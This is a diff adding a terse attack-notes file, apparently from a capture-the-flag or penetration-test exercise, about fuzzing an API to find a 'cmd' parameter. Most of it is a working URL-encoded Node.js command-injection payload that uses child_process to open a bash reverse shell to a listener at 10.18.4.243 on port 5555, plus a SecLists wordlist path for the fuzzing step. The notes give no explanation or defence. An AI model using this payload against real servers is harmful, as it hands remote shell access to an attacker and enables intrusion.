@@ -1,0 +1,8 @@
+api
+
+fuzz endpoints
+
+/usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt
+to get ?cmd something..
+?cmd=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.18.4.243/5555+0>%261"')
+&=%26
